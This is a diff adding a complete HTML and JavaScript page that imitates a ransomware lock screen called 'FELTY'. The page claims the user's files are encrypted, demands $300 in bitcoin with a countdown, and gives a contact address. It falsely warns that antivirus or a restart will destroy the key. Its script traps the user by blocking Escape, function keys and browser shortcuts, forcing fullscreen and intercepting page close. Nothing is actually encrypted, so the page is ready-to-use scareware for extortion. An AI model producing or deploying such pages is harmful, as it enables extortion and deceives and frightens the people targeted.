@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FELTY · SYSTEM LOCKED</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+        width: 100%; height: 100%; overflow: hidden;
+        background: #000;
+        font-family: 'Courier New', 'Consolas', monospace;
+        user-select: none;
+    }
+
+    .screen {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: #000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .terminal {
+        width: 820px;
+        max-width: 94vw;
+        border: 2px solid #cc0000;
+        background: #0a0000;
+        padding: 30px;
+        position: relative;
+    }
+
+    .terminal::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0; height: 2px;
+        background: linear-gradient(90deg, transparent, #ff0000, transparent);
+        animation: scanline 3s linear infinite;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(100%); }
+    }
+
+    /* ─── HEX LOGO (instead of skull) ─── */
+    .logo {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 8px;
+        gap: 0;
+        line-height: 1;
+    }
+
+    .logo pre {
+        color: #cc0000;
+        font-size: 12px;
+        line-height: 1.15;
+        letter-spacing: 0;
+        text-shadow: 0 0 15px rgba(200,0,0,0.4);
+        font-weight: bold;
+    }
+
+    .logo-line {
+        text-align: center;
+        margin-bottom: 6px;
+    }
+
+    .logo-line span {
+        display: inline-block;
+        color: #cc0000;
+        font-size: 10px;
+        letter-spacing: 1px;
+        text-shadow: 0 0 10px rgba(200,0,0,0.3);
+    }
+
+    /* ─── TITLE BAR ─── */
+    .title-bar {
+        text-align: center;
+        border-bottom: 1px solid #cc000044;
+        padding-bottom: 12px;
+        margin-bottom: 18px;
+    }
+
+    .title-bar h1 {
+        color: #ff0000;
+        font-size: 32px;
+        letter-spacing: 12px;
+        text-shadow: 0 0 30px rgba(255,0,0,0.3);
+        text-transform: uppercase;
+        font-weight: normal;
+    }
+
+    .title-bar .sub {
+        color: #ff4444;
+        font-size: 11px;
+        letter-spacing: 4px;
+        margin-top: 6px;
+        text-transform: uppercase;
+    }
+
+    /* ─── INFO SECTION ─── */
+    .info-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+        margin-bottom: 16px;
+    }
+
+    @media (max-width: 700px) {
+        .info-grid { grid-template-columns: 1fr; }
+    }
+
+    .info-panel {
+        border: 1px solid #cc000033;
+        padding: 16px;
+        background: #050000;
+    }
+
+    .info-panel .label {
+        color: #ff4444;
+        font-size: 10px;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+        border-bottom: 1px solid #cc000022;
+        padding-bottom: 4px;
+    }
+
+    .info-panel .value {
+        color: #ff8888;
+        font-size: 12px;
+        line-height: 1.6;
+    }
+
+    .info-panel .value .hl {
+        color: #ffcc00;
+    }
+
+    .info-panel .value .red {
+        color: #ff0000;
+        font-weight: bold;
+    }
+
+    /* ─── PASSWORD BOX ─── */
+    .password-area {
+        border: 1px solid #cc000044;
+        padding: 18px 20px;
+        margin-bottom: 16px;
+        background: #050000;
+        text-align: center;
+    }
+
+    .password-area .prompt {
+        color: #ff4444;
+        font-size: 11px;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        margin-bottom: 12px;
+    }
+
+    .password-row {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0;
+        flex-wrap: wrap;
+    }
+
+    .password-row .arrow {
+        color: #ff0000;
+        font-size: 18px;
+        margin-right: 8px;
+        animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+    }
+
+    .password-row input {
+        background: #000;
+        border: 1px solid #cc000055;
+        color: #ffcccc;
+        font-family: 'Courier New', monospace;
+        font-size: 16px;
+        padding: 8px 14px;
+        width: 260px;
+        text-align: center;
+        letter-spacing: 6px;
+        outline: none;
+    }
+
+    .password-row input:focus {
+        border-color: #cc0000aa;
+        box-shadow: 0 0 15px rgba(200,0,0,0.15);
+    }
+
+    .password-row button {
+        background: #cc0000;
+        border: none;
+        color: #fff;
+        font-family: 'Courier New', monospace;
+        font-size: 13px;
+        font-weight: bold;
+        padding: 9px 22px;
+        margin-left: 6px;
+        cursor: pointer;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        transition: background 0.2s;
+    }
+
+    .password-row button:hover {
+        background: #ff0000;
+    }
+
+    .password-status {
+        margin-top: 10px;
+        font-size: 12px;
+        min-height: 18px;
+        color: #ff4444;
+    }
+
+    .password-attempts {
+        margin-top: 4px;
+        font-size: 11px;
+        color: #ff8800;
+    }
+
+    .password-warn {
+        margin-top: 10px;
+        font-size: 10px;
+        color: #ff444466;
+        line-height: 1.5;
+    }
+
+    .password-warn strong {
+        color: #ff6666;
+    }
+
+    /* ─── BTC / PAYMENT ─── */
+    .payment-box {
+        text-align: center;
+        padding: 12px;
+        background: #080000;
+        border: 1px solid #cc000033;
+        margin-bottom: 12px;
+    }
+
+    .payment-box .btc-amount {
+        color: #ffcc00;
+        font-size: 14px;
+        letter-spacing: 1px;
+    }
+
+    .payment-box .btc-addr {
+        color: #ff8800;
+        font-size: 11px;
+        word-break: break-all;
+        margin-top: 4px;
+    }
+
+    .payment-box .btc-label {
+        color: #ff6666;
+        font-size: 9px;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+    }
+
+    #qrcode {
+        margin: 8px auto;
+        width: 100px; height: 100px;
+    }
+    #qrcode canvas { width: 100px !important; height: 100px !important; }
+
+    /* ─── COUNTDOWN ─── */
+    .countdown-box {
+        text-align: center;
+        padding: 8px;
+        border-top: 1px solid #cc000022;
+        margin-top: 6px;
+    }
+
+    .countdown-box .timer {
+        color: #ff0000;
+        font-size: 22px;
+        letter-spacing: 4px;
+        font-weight: bold;
+        text-shadow: 0 0 20px rgba(255,0,0,0.2);
+    }
+
+    .countdown-box .label {
+        color: #ff444466;
+        font-size: 9px;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+    }
+
+    /* ─── FOOTER WARNINGS ─── */
+    .warnings {
+        border: 1px solid #cc000033;
+        padding: 12px 16px;
+        margin-top: 12px;
+        background: #050000;
+    }
+
+    .warnings .w-line {
+        color: #ff444488;
+        font-size: 10px;
+        padding: 2px 0;
+        letter-spacing: 0.5px;
+    }
+
+    .warnings .w-line::before {
+        content: '>> ';
+        color: #cc0000;
+    }
+
+    .warnings .w-line.critical {
+        color: #ff4444;
+    }
+
+    /* ─── CONTACT ─── */
+    .contact-line {
+        text-align: center;
+        margin-top: 14px;
+        padding-top: 12px;
+        border-top: 1px solid #cc000022;
+    }
+
+    .contact-line span {
+        color: #ff444488;
+        font-size: 10px;
+        letter-spacing: 1px;
+    }
+
+    .contact-line .email {
+        color: #ff8800;
+        font-size: 12px;
+    }
+
+    /* ─── PERMANENT LOCK OVERLAY ─── */
+    .perma-overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        z-index: 99999;
+        overflow: hidden;
+    }
+
+    .perma-overlay.active { display: flex; align-items: center; justify-content: center; }
+
+    .perma-overlay .flash-layer {
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        animation: fastFlash 0.15s infinite;
+        pointer-events: none;
+    }
+
+    @keyframes fastFlash {
+        0%   { background-color: #000000; }
+        50%  { background-color: #b40000; }
+        100% { background-color: #000000; }
+    }
+
+    .perma-overlay .perma-content {
+        position: relative;
+        z-index: 1;
+        text-align: center;
+        padding: 40px;
+    }
+
+    .perma-overlay .perma-hex {
+        color: #cc0000;
+        font-size: 10px;
+        line-height: 1.2;
+        margin-bottom: 20px;
+        text-shadow: 0 0 20px rgba(200,0,0,0.5);
+    }
+
+    .perma-overlay .perma-title {
+        font-size: 36px;
+        color: #ffffff;
+        text-shadow: 0 0 40px #ff0000, 0 0 80px #ff000066;
+        letter-spacing: 8px;
+        margin-bottom: 10px;
+        font-weight: bold;
+    }
+
+    .perma-overlay .perma-sub {
+        font-size: 18px;
+        color: #ff4444;
+        letter-spacing: 6px;
+        margin-bottom: 25px;
+    }
+
+    .perma-overlay .perma-line {
+        font-size: 14px;
+        color: #ff8888;
+        margin: 5px 0;
+        letter-spacing: 1px;
+    }
+
+    .perma-overlay .perma-line.highlight {
+        color: #ff0000;
+        font-size: 18px;
+        font-weight: bold;
+        text-shadow: 0 0 30px #ff0000;
+    }
+
+    /* ─── REBOOT MESSAGE ─── */
+    .reboot-msg {
+        display: none;
+        border: 1px solid #cc000044;
+        padding: 14px;
+        margin-bottom: 14px;
+        background: #080000;
+        text-align: center;
+    }
+    .reboot-msg.active { display: block; }
+    .reboot-msg h3 { color: #ff4444; font-size: 13px; letter-spacing: 3px; text-transform: uppercase; }
+    .reboot-msg p { color: #ff8888; font-size: 11px; margin-top: 6px; }
+
+    /* ─── SUCCESS ─── */
+    .success-overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: #000;
+        z-index: 100000;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+    }
+    .success-overlay.active { display: flex; }
+    .success-overlay h1 { color: #00ff00; font-size: 28px; letter-spacing: 6px; }
+    .success-overlay p { color: #66ff66; font-size: 14px; margin-top: 16px; }
+
+    /* ─── MATRIX ─── */
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        z-index: -1;
+        opacity: 0.04;
+        pointer-events: none;
+    }
+</style>
+</head>
+<body>
+
+<canvas id="matrix-bg"></canvas>
+
+<div class="screen" id="mainScreen">
+<div class="terminal">
+
+    <!-- ─── HEX LOGO (Petya-style, no skull) ─── -->
+    <div class="logo">
+        <pre>
+    ╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗
+    ║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║
+    ║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗
+    ║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║
+    ║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║
+    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝
+        </pre>
+    </div>
+
+    <!-- ─── REBOOT MESSAGE ─── -->
+    <div class="reboot-msg" id="rebootMsg">
+        <h3>// REBOOT DETECTED //</h3>
+        <p>YOU DON'T GET RID OF ME THAT EASILY. YOUR FILES ARE STILL ENCRYPTED.</p>
+    </div>
+
+    <!-- ─── TITLE ─── -->
+    <div class="title-bar">
+        <h1>FELTY</h1>
+        <div class="sub">// YOUR SYSTEM HAS BEEN LOCKED //</div>
+    </div>
+
+    <!-- ─── PASSWORD ─── -->
+    <div class="password-area">
+        <div class="prompt">> ENTER DECRYPTION PASSWORD TO UNLOCK SYSTEM</div>
+        <div class="password-row">
+            <span class="arrow">></span>
+            <input type="password" id="passwordInput" maxlength="64" placeholder="PASSWORD" autofocus>
+            <button id="unlockBtn">UNLOCK</button>
+        </div>
+        <div class="password-status" id="statusText"></div>
+        <div class="password-attempts" id="attemptsText">[ ATTEMPTS REMAINING: 5 ]</div>
+        <div class="password-warn">
+            <strong>WARNING:</strong> After 5 failed attempts, the decryption key is permanently destroyed.
+            There will be NO RECOVERY POSSIBLE.
+        </div>
+    </div>
+
+    <!-- ─── INFO GRID ─── -->
+    <div class="info-grid">
+        <div class="info-panel">
+            <div class="label">// SYSTEM STATUS</div>
+            <div class="value">
+                Encryption: <span class="red">AES-256-CBC</span><br>
+                Key Exchange: <span class="red">RSA-4096</span><br>
+                Machine ID: <span class="hl" id="machineId">XXXXXXXX</span><br>
+                Status: <span class="red">LOCKED</span>
+            </div>
+        </div>
+        <div class="info-panel">
+            <div class="label">// PAYMENT REQUIRED</div>
+            <div class="payment-box">
+                <div class="btc-label">RANSOM AMOUNT</div>
+                <div class="btc-amount">$300.00 USD</div>
+                <div id="qrcode"></div>
+                <div class="btc-label">BITCOIN ADDRESS</div>
+                <div class="btc-addr">1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7</div>
+            </div>
+            <div class="countdown-box">
+                <div class="label">PRICE DOUBLES IN</div>
+                <div class="timer" id="countdown">72:00:00</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── WARNINGS ─── -->
+    <div class="warnings">
+        <div class="w-line critical">DO NOT ATTEMPT TO DECRYPT FILES YOURSELF</div>
+        <div class="w-line">DO NOT RUN ANTIVIRUS — IT WILL DELETE THE DECRYPTION KEY</div>
+        <div class="w-line">DO NOT SHUT DOWN OR RESTART YOUR COMPUTER</div>
+        <div class="w-line">ONLY THE FELTY DECRYPTION TOOL CAN RESTORE YOUR FILES</div>
+    </div>
+
+    <!-- ─── CONTACT ─── -->
+    <div class="contact-line">
+        <span>CONTACT FOR RECOVERY: </span>
+        <span class="email">feltyhelp@onionmail.org</span>
+        <span>  |  Machine ID: <span class="hl" id="machineId2">XXXX</span></span>
+    </div>
+
+</div>
+</div>
+
+<!-- ─── PERMANENT LOCK ─── -->
+<div class="perma-overlay" id="permaOverlay">
+    <div class="flash-layer"></div>
+    <div class="perma-content">
+        <div class="perma-hex">
+╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗<br>
+║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║<br>
+║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗<br>
+║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║<br>
+║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║<br>
+╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝
+        </div>
+        <div class="perma-title">FILES DESTROYED</div>
+        <div class="perma-sub">// PERMANENTLY ENCRYPTED //</div>
+        <div class="perma-line" style="margin-top:30px;">You had 5 attempts to recover your data.</div>
+        <div class="perma-line">You failed every single one.</div>
+        <div class="perma-line highlight">NOTHING CAN SAVE YOUR FILES NOW.</div>
+        <div class="perma-line" style="margin-top:30px; font-size:11px; color:#ff444466;">
+            [ THIS SYSTEM IS PERMANENTLY LOCKED — REINSTALL YOUR OS ]
+        </div>
+    </div>
+</div>
+
+<!-- ─── SUCCESS ─── -->
+<div class="success-overlay" id="successOverlay">
+    <div>
+        <div style="font-size:48px; color:#00ff00;">✓</div>
+        <h1>DECRYPTION SUCCESSFUL</h1>
+        <p>Your files are being restored. This window will close.</p>
+    </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════
+const CONFIG = {
+    password: "FELTY-RECOVER-2025",
+    maxAttempts: 5,
+    machineId: (() => {
+        const h = () => Math.floor(Math.random()*256).toString(16).toUpperCase().padStart(2,'0');
+        return `${h()}${h()}${h()}${h()}-${h()}${h()}-${h()}${h()}-${h()}${h()}-${h()}${h()}${h()}${h()}`;
+    })(),
+};
+
+let attemptsLeft = CONFIG.maxAttempts;
+let isPermanentLock = false;
+let startTime = Date.now();
+
+const passwordInput = document.getElementById('passwordInput');
+const statusText = document.getElementById('statusText');
+const attemptsText = document.getElementById('attemptsText');
+const permaOverlay = document.getElementById('permaOverlay');
+const successOverlay = document.getElementById('successOverlay');
+const rebootMsg = document.getElementById('rebootMsg');
+
+// ─── Check for reboot ─────────────────────────────────────────────
+try {
+    if (localStorage.getItem('felty_reboot') === 'true') {
+        rebootMsg.classList.add('active');
+    }
+} catch(e) {}
+
+// ─── Init ─────────────────────────────────────────────────────────
+document.getElementById('machineId').textContent = CONFIG.machineId;
+document.getElementById('machineId2').textContent = CONFIG.machineId;
+updateAttempts();
+passwordInput.focus();
+initMatrix();
+generateQR();
+setInterval(updateCountdown, 1000);
+
+// ─── Password check ───────────────────────────────────────────────
+function checkPassword() {
+    if (isPermanentLock) return;
+    const input = passwordInput.value.trim();
+    if (input === '') { statusText.textContent = '> ERROR: No password entered.'; return; }
+
+    if (input === CONFIG.password) {
+        statusText.textContent = '> PASSWORD ACCEPTED. INITIALIZING DECRYPTION...';
+        statusText.style.color = '#00ff00';
+        passwordInput.disabled = true;
+        document.querySelector('#unlockBtn').disabled = true;
+        try { localStorage.removeItem('felty_reboot'); } catch(e) {}
+        setTimeout(() => successOverlay.classList.add('active'), 1200);
+        return;
+    }
+
+    attemptsLeft--;
+    updateAttempts();
+    if (attemptsLeft <= 0) { activatePermanentLock(); return; }
+    statusText.textContent = `> ERROR: Incorrect password. ${attemptsLeft} attempt(s) remaining.`;
+    passwordInput.value = '';
+    passwordInput.focus();
+}
+
+function updateAttempts() {
+    attemptsText.textContent = `[ ATTEMPTS REMAINING: ${attemptsLeft} ]`;
+    attemptsText.style.color = attemptsLeft <= 2 ? '#ff4444' : '#ff8800';
+}
+
+// ─── Permanent lock ───────────────────────────────────────────────
+function activatePermanentLock() {
+    isPermanentLock = true;
+    document.getElementById('mainScreen').style.display = 'none';
+    permaOverlay.classList.add('active');
+    passwordInput.disabled = true;
+    try { localStorage.setItem('felty_perma_lock', 'true'); } catch(e) {}
+    try { document.documentElement.requestFullscreen(); } catch(e) {}
+}
+
+// ─── Matrix ───────────────────────────────────────────────────────
+function initMatrix() {
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const chars = 'FELTY01HEX';
+    const fontSize = 12;
+    const cols = Math.floor(canvas.width / fontSize);
+    const drops = Array(cols).fill(1).map(() => Math.random() * 100);
+    setInterval(() => {
+        ctx.fillStyle = 'rgba(0,0,0,0.06)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.font = fontSize + 'px monospace';
+        for (let i = 0; i < drops.length; i++) {
+            ctx.fillStyle = `rgba(200,${Math.floor(Math.random()*30)},0,${0.1+Math.random()*0.3})`;
+            ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
+            if (drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }, 70);
+}
+
+// ─── QR ───────────────────────────────────────────────────────────
+function generateQR() {
+    const el = document.getElementById('qrcode');
+    const c = document.createElement('canvas');
+    c.width = 100; c.height = 100;
+    const ctx = c.getContext('2d');
+    ctx.fillStyle = '#000'; ctx.fillRect(0,0,100,100);
+    const cs = 4;
+    for (let r = 0; r < 25; r++) {
+        for (let col = 0; col < 25; col++) {
+            let v = 0;
+            if (r<7 && col<7) v = (r===0||r===6||col===0||col===6||(r>=2&&r<=4&&col>=2&&col<=4))?1:0;
+            else if (r<7 && col>17) v = (r===0||r===6||col===18||col===24||(r>=2&&r<=4&&col>=20&&col<=22))?1:0;
+            else if (r>17 && col<7) v = (r===18||r===24||col===0||col===6||(r>=20&&r<=22&&col>=2&&col<=4))?1:0;
+            else v = Math.random() > 0.6 ? 1 : 0;
+            ctx.fillStyle = v ? '#cc0000' : '#0a0000';
+            ctx.fillRect(col*cs, r*cs, cs, cs);
+        }
+    }
+    ctx.fillStyle = '#0a0000'; ctx.fillRect(35,35,30,30);
+    ctx.fillStyle = '#cc0000'; ctx.font = '12px monospace';
+    ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+    ctx.fillText('₿', 50, 50);
+    el.appendChild(c);
+}
+
+// ─── Countdown ────────────────────────────────────────────────────
+function updateCountdown() {
+    const elapsed = (Date.now() - startTime) / 1000;
+    const remaining = Math.max(0, 72*3600 - elapsed);
+    const h = Math.floor(remaining/3600);
+    const m = Math.floor((remaining%3600)/60);
+    const s = Math.floor(remaining%60);
+    document.getElementById('countdown').textContent =
+        `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+}
+
+// ─── Escape prevention ────────────────────────────────────────────
+document.addEventListener('keydown', (e) => {
+    if (['Escape','F11','F5','F3','F1','F2','F4','F6','F7','F8','F9','F10','F12'].includes(e.key)) {
+        e.preventDefault(); return false;
+    }
+    if (e.ctrlKey && ['w','r','n','t','q','s','o','p','u','i','j','h'].includes(e.key.toLowerCase())) {
+        e.preventDefault(); return false;
+    }
+    if (e.altKey && ['f4','tab','escape','esc'].includes(e.key.toLowerCase())) {
+        e.preventDefault(); return false;
+    }
+    if (e.key === 'Enter') { e.preventDefault(); checkPassword(); }
+});
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+window.addEventListener('beforeunload', (e) => {
+    e.preventDefault();
+    e.returnValue = 'WARNING: Closing this window will permanently destroy your files.';
+    return e.returnValue;
+});
+setInterval(() => {
+    if (!document.fullscreenElement && !isPermanentLock) {
+        try { document.documentElement.requestFullscreen(); } catch(e) {}
+    }
+}, 5000);
+
+document.getElementById('unlockBtn').addEventListener('click', checkPassword);
+passwordInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); checkPassword(); }
+});
+document.addEventListener('click', () => { if (!isPermanentLock) passwordInput.focus(); });
+
+console.log('%c[ FELTY ]', 'font-size:18px; color:#cc0000; font-weight:bold;');
+console.log('%cSystem locked. Password required.', 'font-size:12px; color:#ff6666;');
+console.log('%c5 attempts remaining.', 'font-size:12px; color:#ff8800;');
+</script>
+</body>
+</html>
